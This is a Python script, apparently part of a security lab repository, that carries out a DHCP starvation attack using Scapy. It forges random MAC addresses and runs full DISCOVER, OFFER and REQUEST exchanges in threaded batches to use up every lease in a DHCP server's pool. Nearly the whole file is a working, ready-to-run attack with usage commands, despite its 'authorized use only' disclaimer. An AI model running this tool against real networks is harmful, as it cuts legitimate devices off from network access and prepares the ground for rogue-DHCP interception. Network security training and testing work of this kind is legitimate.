#!/usr/bin/env python3
# Phase 2 - DHCP starvation.
# Grab as many leases as we can using random spoofed MACs. For each fake client
# we do the full DISCOVER -> OFFER -> REQUEST handshake so the server actually
# commits the lease, which empties its pool.
#   sudo python3 dhcp_starve.py -i eth0 -c 254
# Then check /var/lib/dhcp/dhcpd.leases to confirm the pool is full.
# Authorized, isolated networks only - see ../../DISCLAIMER.md.

import argparse
import random
import threading

from scapy.all import Ether, IP, UDP, BOOTP, DHCP, srp1, sendp, conf

conf.promisc = True
conf.checkIPaddr = False   # offered IP won't match our 0.0.0.0 source

success = 0
lock = threading.Lock()


def random_mac():
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] & 0xFE) | 0x02   # locally administered, unicast
    return ':'.join('%02x' % o for o in octets)


def grab_lease(iface, timeout):
    global success
    try:
        mac = random_mac()
        mac_bytes = bytes(int(x, 16) for x in mac.split(':'))
        xid = random.randint(1, 0xFFFFFFFF)

        discover = (Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
                    IP(src='0.0.0.0', dst='255.255.255.255') /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac_bytes, xid=xid) /
                    DHCP(options=[('message-type', 'discover'), 'end']))

        offer = srp1(discover, iface=iface, timeout=timeout, verbose=0)
        if not offer or DHCP not in offer:
            return

        offered_ip = offer[BOOTP].yiaddr
        server_ip = offer[IP].src

        request = (Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') /
                   IP(src='0.0.0.0', dst='255.255.255.255') /
                   UDP(sport=68, dport=67) /
                   BOOTP(chaddr=mac_bytes, xid=xid) /
                   DHCP(options=[('message-type', 'request'),
                                 ('server_id', server_ip),
                                 ('requested_addr', offered_ip),
                                 'end']))
        sendp(request, iface=iface, verbose=0)

        with lock:
            success += 1
            print(f'[+] Leased {offered_ip:<15} | MAC {mac} | total: {success}')

    except Exception:
        # once the pool is empty individual handshakes just fail, that's fine
        pass


def run(iface, count, batch, timeout):
    threads = []
    for _ in range(count):
        t = threading.Thread(target=grab_lease, args=(iface, timeout))
        t.start()
        threads.append(t)
        if len(threads) >= batch:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()
    print(f'\nDone: {success} leases grabbed')


if __name__ == '__main__':
    p = argparse.ArgumentParser(description='DHCP starvation (authorized use only)')
    p.add_argument('-i', '--iface', default='eth0')
    p.add_argument('-c', '--count', type=int, default=254, help='leases to attempt')
    p.add_argument('-t', '--threads', type=int, default=10, help='how many at a time')
    p.add_argument('--timeout', type=int, default=3, help='seconds to wait per offer')
    args = p.parse_args()

    print(f'[*] Starving DHCP on {args.iface}: up to {args.count} leases, '
          f'{args.threads} at a time\n')
    run(args.iface, args.count, args.threads, args.timeout)
